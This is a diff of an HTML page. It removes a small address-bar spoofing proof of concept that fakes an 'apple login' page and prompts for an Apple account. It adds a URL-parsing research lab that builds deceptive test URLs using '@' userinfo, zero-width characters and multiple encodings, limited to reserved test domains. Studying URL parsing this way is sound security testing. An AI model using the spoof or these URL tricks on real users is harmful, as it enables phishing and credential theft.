@@ -1,24 +1,654 @@
-<h1 id="msg">Next,type access.apple.com in the address bar.</h1>
-<h1 id="spoof"></h1>
-<script type="text/javascript">
-spoof.style.display = 'none';
-var done = 0;
-var got = 0;
-onbeforeunload = function(ev) {
-  done = 1;
-  return false;
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>URL Anomaly Research Lab</title>
+
+<style>
+:root {
+  color-scheme: dark;
+  --bg: #090d16;
+  --panel: #121a29;
+  --border: #26344b;
+  --text: #e6edf8;
+  --muted: #91a0b8;
+  --accent: #6da8ff;
+  --green: #55d6a0;
 }
-onmousemove = function() {
-  stop();
-  if (done && !got) {
-    msg.style.display = 'none';
-    got = "1000";
-    if (got) {
-      document.write("<title>apple login</title><h1>This is not apple.com!!!</h1><scri"+"pt>onbeforeunload=function(){/*while(1){}*/};document.write('<input id=\\\'log\\\'>');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com');</scrip"+"t>");
-      spoof.style.display = 'block';
-      log.value = got;
-      
-    }
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  padding: 24px;
+  background: var(--bg);
+  color: var(--text);
+  font: 14px/1.6 system-ui, sans-serif;
+}
+main { max-width: 1150px; margin: auto; }
+h1 { font-size: 27px; margin-bottom: 4px; }
+h2 { font-size: 18px; }
+p { color: var(--muted); }
+.panel {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 18px;
+  margin: 16px 0;
+}
+.controls {
+  display: grid;
+  grid-template-columns: repeat(auto-fit,minmax(180px,1fr));
+  gap: 12px;
+}
+label { display: block; color: var(--muted); margin-bottom: 5px; }
+input, select {
+  width: 100%;
+  background: #090f1c;
+  color: var(--text);
+  border: 1px solid var(--border);
+  border-radius: 7px;
+  padding: 10px;
+}
+button {
+  border: 1px solid var(--border);
+  background: #1a2940;
+  color: var(--text);
+  border-radius: 7px;
+  padding: 9px 13px;
+  cursor: pointer;
+}
+button:hover { border-color: var(--accent); }
+button.primary { background: #24559a; }
+button.launch { background: #174c3b; }
+button:disabled { opacity: .5; cursor: not-allowed; }
+.tabs {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin: 18px 0;
+}
+.tabs button.active { background: #24559a; }
+.payload {
+  border: 1px solid var(--border);
+  border-radius: 9px;
+  padding: 13px;
+  margin: 10px 0;
+  background: #0d1422;
+}
+.payload code, pre {
+  display: block;
+  overflow-wrap: anywhere;
+  white-space: pre-wrap;
+  color: #a9cbff;
+}
+.payload .actions {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-top: 10px;
+}
+.badge {
+  color: var(--green);
+  font-size: 11px;
+  text-transform: uppercase;
+}
+#results {
+  max-height: 420px;
+  overflow: auto;
+}
+.result {
+  border-bottom: 1px solid var(--border);
+  padding: 10px 0;
+}
+small { color: var(--muted); }
+.hidden { display: none; }
+</style>
+</head>
+
+<body>
+<main>
+  <h1>URL Anomaly Research Lab</h1>
+  <p>Browser URL parsing, normalization and navigation testing suite.</p>
+
+  <section class="panel">
+    <h2>Configuration</h2>
+    <div class="controls">
+      <div>
+        <label for="target">Laboratory hostname</label>
+        <input id="target" value="lab.example.test">
+      </div>
+      <div>
+        <label for="width">Window width</label>
+        <input id="width" type="number" value="800" min="200" max="1600">
+      </div>
+      <div>
+        <label for="height">Window height</label>
+        <input id="height" type="number" value="600" min="200" max="1200">
+      </div>
+      <div>
+        <label for="delay">Logging delay (ms)</label>
+        <input id="delay" type="number" value="500" min="0" max="10000">
+      </div>
+    </div>
+    <p><small>Navigation is restricted to reserved testing domains. Use a local lab for other targets.</small></p>
+  </section>
+
+  <div class="tabs" id="tabs"></div>
+
+  <section class="panel">
+    <div class="controls">
+      <div>
+        <label for="search">Search payloads</label>
+        <input id="search" placeholder="Search test cases...">
+      </div>
+      <div>
+        <label for="filter">Payload category</label>
+        <select id="filter">
+          <option value="all">All payloads</option>
+          <option value="unicode">Unicode</option>
+          <option value="delimiter">Delimiters</option>
+          <option value="encoding">Encoding</option>
+          <option value="path">Path / Query</option>
+          <option value="navigation">Navigation</option>
+          <option value="hybrid">Hybrid</option>
+        </select>
+      </div>
+    </div>
+    <div id="payloads"></div>
+  </section>
+
+  <section class="panel">
+    <h2>Custom URL parser</h2>
+    <label for="custom">Enter a URL to inspect</label>
+    <input id="custom" value="https://example.com@lab.example.test/path">
+    <br><br>
+    <button class="primary" onclick="inspectCustom()">Parse URL</button>
+    <button onclick="copyCustom()">Copy URL</button>
+    <pre id="customResult">Waiting for input...</pre>
+  </section>
+
+  <section class="panel">
+    <h2>Mutation generator</h2>
+    <p>Generate additional test strings using independent URL transformations.</p>
+    <button class="primary" onclick="generateMutations()">Generate 30 variations</button>
+    <button onclick="exportJSON()">Export JSON</button>
+    <button onclick="clearLog()">Clear history</button>
+    <pre id="generatorResult">No generated variations yet.</pre>
+  </section>
+
+  <section class="panel">
+    <h2>Execution / parsing history</h2>
+    <div id="results"><small>No tests executed.</small></div>
+  </section>
+</main>
+
+<script>
+"use strict";
+
+// Reserved testing hostnames only.
+const RESERVED = [
+  "example.test",
+  "example.com",
+  "example.org",
+  "localhost"
+];
+
+const groups = {
+  unicode: {
+    label: "Unicode anomalies",
+    tests: [
+      ["U01","Zero-width space","%E2%80%8B"],
+      ["U02","Zero-width joiner","%E2%80%8D"],
+      ["U03","Zero-width non-joiner","%E2%80%8C"],
+      ["U04","Ideographic space","%E3%80%80"],
+      ["U05","Thin space","%E2%80%89"],
+      ["U06","Word joiner","%E2%81%A0"],
+      ["U07","Byte order mark","%EF%BB%BF"],
+      ["U08","Mixed Unicode spaces","%E2%80%8B%E3%80%80"],
+      ["U09","Encoded line separator","%E2%80%A8"],
+      ["U10","Encoded paragraph separator","%E2%80%A9"]
+    ]
+  },
+
+  delimiter: {
+    label: "Delimiter anomalies",
+    tests: [
+      ["D01","Single @","@"],
+      ["D02","Double @","@@"],
+      ["D03","Four @","@@@@"],
+      ["D04","Encoded @","%40"],
+      ["D05","Double encoded @","%2540"],
+      ["D06","Repeated dots",".."],
+      ["D07","Triple dots","..."],
+      ["D08","Encoded dot","%2E"],
+      ["D09","Encoded slash","%2F"],
+      ["D10","Encoded backslash","%5C"]
+    ]
+  },
+
+  encoding: {
+    label: "Encoding anomalies",
+    tests: [
+      ["E01","Single encoded slash","%2F"],
+      ["E02","Double encoded slash","%252F"],
+      ["E03","Triple encoded slash","%25252F"],
+      ["E04","Encoded colon","%3A"],
+      ["E05","Double encoded colon","%253A"],
+      ["E06","Encoded percent","%25"],
+      ["E07","Encoded question mark","%3F"],
+      ["E08","Encoded hash","%23"],
+      ["E09","Encoded ampersand","%26"],
+      ["E10","Encoded equals","%3D"]
+    ]
+  },
+
+  path: {
+    label: "Path and query anomalies",
+    tests: [
+      ["P01","Repeated slash","//path"],
+      ["P02","Parent directory","/a/../path"],
+      ["P03","Current directory","/a/./path"],
+      ["P04","Encoded path separator","/%2F/path"],
+      ["P05","Double encoded separator","/%252F/path"],
+      ["P06","Query URL","/?next=https%3A%2F%2Fexample.com"],
+      ["P07","Fragment URL","/#https://example.com"],
+      ["P08","Nested URL","/redirect/https%3A%2F%2Fexample.com"],
+      ["P09","Repeated query","/?a=1&a=2"],
+      ["P10","Empty query","/?"]
+    ]
+  },
+
+  navigation: {
+    label: "Navigation behavior",
+    tests: [
+      ["N01","Normal path","/"],
+      ["N02","Path with query","/?test=1"],
+      ["N03","Path with fragment","/#test"],
+      ["N04","Nested path","/a/b/c"],
+      ["N05","Encoded path","/%74%65%73%74"],
+      ["N06","Query separators","/?a=1&b=2"],
+      ["N07","Empty fragment","/#"],
+      ["N08","Trailing slash","/test/"]
+    ]
+  },
+
+  hybrid: {
+    label: "Hybrid anomalies",
+    tests: [
+      ["H01","Unicode + delimiter","%E2%80%8B@"],
+      ["H02","Encoding + delimiter","%252F@"],
+      ["H03","Repeated @ + path","@@/path"],
+      ["H04","Unicode + encoding","%E3%80%80%252F"],
+      ["H05","Encoded dot + slash","%2E%2F"],
+      ["H06","Mixed separators","/%2F%5C/"],
+      ["H07","Query + fragment","/?a=1#test"],
+      ["H08","Repeated encoding","%2525252F"],
+      ["H09","Unicode + query","%E2%80%8B?test=1"],
+      ["H10","Nested path + encoding","/a/%2E%2E/b"]
+    ]
+  }
+};
+
+let activeGroup = "unicode";
+let history = [];
+let generated = [];
+
+const tabs = document.getElementById("tabs");
+const payloads = document.getElementById("payloads");
+
+function getTarget() {
+  const value = document.getElementById("target").value.trim();
+
+  if (!/^[a-zA-Z0-9.-]+$/.test(value)) {
+    throw new Error("Invalid hostname.");
+  }
+
+  if (!RESERVED.some(host =>
+    value === host || value.endsWith("." + host)
+  )) {
+    throw new Error(
+      "Only reserved test domains are allowed: " +
+      RESERVED.join(", ")
+    );
+  }
+
+  return value;
+}
+
+// Create a harmless test URL using the configured lab host.
+function buildURL(category, payload) {
+  const host = getTarget();
+
+  if (category === "unicode" ||
+      category === "delimiter" ||
+      category === "encoding") {
+    return "https://example.com" + payload +
+      "@" + host + "/test";
+  }
+
+  if (category === "path") {
+    return "https://" + host + payload;
+  }
+
+  if (category === "navigation") {
+    return "https://" + host + payload;
+  }
+
+  return "https://example.com" + payload +
+    "@" + host + "/test";
+}
+
+function parseURL(raw) {
+  try {
+    const u = new URL(raw);
+    return {
+      valid: true,
+      href: u.href,
+      origin: u.origin,
+      protocol: u.protocol,
+      hostname: u.hostname,
+      port: u.port,
+      username: u.username,
+      pathname: u.pathname,
+      search: u.search,
+      hash: u.hash
+    };
+  } catch (error) {
+    return {
+      valid: false,
+      error: error.message
+    };
   }
 }
+
+function renderTabs() {
+  tabs.innerHTML = "";
+
+  Object.entries(groups).forEach(([key, group]) => {
+    const button = document.createElement("button");
+    button.textContent = group.label;
+    button.className = key === activeGroup ? "active" : "";
+
+    button.onclick = () => {
+      activeGroup = key;
+      document.getElementById("filter").value =
+        key === "unicode" || key === "delimiter" ||
+        key === "encoding" || key === "path" ||
+        key === "navigation" || key === "hybrid"
+          ? key : "all";
+      renderTabs();
+      renderPayloads();
+    };
+
+    tabs.appendChild(button);
+  });
+}
+
+function renderPayloads() {
+  payloads.innerHTML = "";
+
+  const search = document.getElementById("search")
+    .value.toLowerCase();
+
+  const filter = document.getElementById("filter").value;
+
+  Object.entries(groups).forEach(([category, group]) => {
+    if (filter !== "all" && filter !== category) return;
+    if (filter === "all" && category !== activeGroup) return;
+
+    group.tests.forEach(([id, name, payload]) => {
+      const text = (id + " " + name + " " + payload)
+        .toLowerCase();
+
+      if (!text.includes(search)) return;
+
+      const url = buildURL(category, payload);
+      const card = document.createElement("div");
+      card.className = "payload";
+
+      const heading = document.createElement("strong");
+      heading.textContent = id + " — " + name;
+
+      const tag = document.createElement("div");
+      tag.className = "badge";
+      tag.textContent = category;
+
+      const code = document.createElement("code");
+      code.textContent = url;
+
+      const actions = document.createElement("div");
+      actions.className = "actions";
+
+      const inspect = document.createElement("button");
+      inspect.textContent = "Inspect";
+      inspect.onclick = () => inspectTest(id, url);
+
+      const copy = document.createElement("button");
+      copy.textContent = "Copy URL";
+      copy.onclick = () => copyText(url);
+
+      const launch = document.createElement("button");
+      launch.className = "launch";
+      launch.textContent = "Open test";
+      launch.onclick = () => launchTest(id, url);
+
+      actions.append(inspect, copy, launch);
+      card.append(tag, heading, code, actions);
+      payloads.appendChild(card);
+    });
+  });
+}
+
+function logResult(id, url, result, action) {
+  const item = {
+    time: new Date().toISOString(),
+    id,
+    action,
+    url,
+    result
+  };
+
+  history.unshift(item);
+  renderHistory();
+}
+
+function inspectTest(id, url) {
+  const result = parseURL(url);
+  logResult(id, url, result, "parse");
+  showResult(result);
+}
+
+function showResult(result) {
+  document.getElementById("customResult").textContent =
+    JSON.stringify(result, null, 2);
+}
+
+function inspectCustom() {
+  const value = document.getElementById("custom").value;
+  showResult(parseURL(value));
+}
+
+function launchTest(id, url) {
+  const result = parseURL(url);
+
+  if (!result.valid) {
+    alert("Invalid URL: " + result.error);
+    return;
+  }
+
+  if (!RESERVED.some(host =>
+    result.hostname === host ||
+    result.hostname.endsWith("." + host)
+  )) {
+    alert("Navigation blocked: destination is not a reserved test domain.");
+    return;
+  }
+
+  const width = Number(document.getElementById("width").value);
+  const height = Number(document.getElementById("height").value);
+  const delay = Number(document.getElementById("delay").value);
+
+  if (
+    !Number.isFinite(width) || width < 200 || width > 1600 ||
+    !Number.isFinite(height) || height < 200 || height > 1200 ||
+    !Number.isFinite(delay) || delay < 0 || delay > 10000
+  ) {
+    alert("Invalid window or delay settings.");
+    return;
+  }
+
+  // Must be called directly from the button click to avoid popup blocking.
+  const opened = window.open(
+    url,
+    "_blank",
+    `width=${width},height=${height}`
+  );
+
+  logResult(id, url, {
+    parsed: result,
+    popupOpened: !!opened,
+    delayConfigured: delay
+  }, "navigation");
+
+  // Delay is used for logging, not delayed popup creation.
+  setTimeout(() => {
+    console.info("Test completed:", id);
+  }, delay);
+}
+
+function renderHistory() {
+  const container = document.getElementById("results");
+  container.innerHTML = "";
+
+  if (!history.length) {
+    container.textContent = "No tests executed.";
+    return;
+  }
+
+  history.forEach(item => {
+    const row = document.createElement("div");
+    row.className = "result";
+
+    const title = document.createElement("strong");
+    title.textContent = item.id + " — " + item.action;
+
+    const time = document.createElement("small");
+    time.textContent = item.time;
+
+    const code = document.createElement("code");
+    code.textContent = item.url;
+
+    const output = document.createElement("pre");
+    output.textContent = JSON.stringify(item.result, null, 2);
+
+    row.append(title, document.createElement("br"),
+      time, code, output);
+
+    container.appendChild(row);
+  });
+}
+
+async function copyText(value) {
+  try {
+    await navigator.clipboard.writeText(value);
+    alert("Copied.");
+  } catch {
+    alert("Clipboard access unavailable.");
+  }
+}
+
+function copyCustom() {
+  copyText(document.getElementById("custom").value);
+}
+
+function generateMutations() {
+  const host = getTarget();
+  const mutations = [
+    "%20", "%09", "%0A", "%0D",
+    "%2F", "%252F", "%2540",
+    "%2E", "%252E", "%5C",
+    "%E2%80%8B", "%E2%80%8C",
+    "%E3%80%80", "%EF%BB%BF",
+    "@", "@@", "@@@@",
+    "..", "...", "....",
+    "%3F", "%23", "%26",
+    "%253F", "%2523", "%2526",
+    "%2F%2F", "%5C%5C",
+    "%E2%80%89", "%E2%81%A0"
+  ];
+
+  generated = mutations.map((mutation, index) => {
+    let url;
+
+    if (index % 2 === 0) {
+      url = "https://example.com" + mutation +
+        "@" + host + "/generated/" + index;
+    } else {
+      url = "https://" + host +
+        "/generated/" + mutation + "?id=" + index;
+    }
+
+    return {
+      id: "G" + String(index + 1).padStart(3, "0"),
+      mutation,
+      url,
+      parsed: parseURL(url)
+    };
+  });
+
+  document.getElementById("generatorResult").textContent =
+    generated.map(item =>
+      item.id + "\n" + item.mutation + "\n" +
+      item.url + "\n" +
+      JSON.stringify(item.parsed, null, 2)
+    ).join("\n\n");
+}
+
+function exportJSON() {
+  const data = {
+    exportedAt: new Date().toISOString(),
+    history,
+    generated
+  };
+
+  const blob = new Blob(
+    [JSON.stringify(data, null, 2)],
+    {type: "application/json"}
+  );
+
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "url-anomaly-results.json";
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+function clearLog() {
+  history = [];
+  renderHistory();
+}
+
+document.getElementById("search")
+  .addEventListener("input", renderPayloads);
+
+document.getElementById("filter")
+  .addEventListener("change", renderPayloads);
+
+document.getElementById("target")
+  .addEventListener("change", () => {
+    try {
+      getTarget();
+      renderPayloads();
+    } catch (error) {
+      alert(error.message);
+    }
+  });
+
+renderTabs();
+renderPayloads();
+renderHistory();
 </script>
+</body>
+</html>
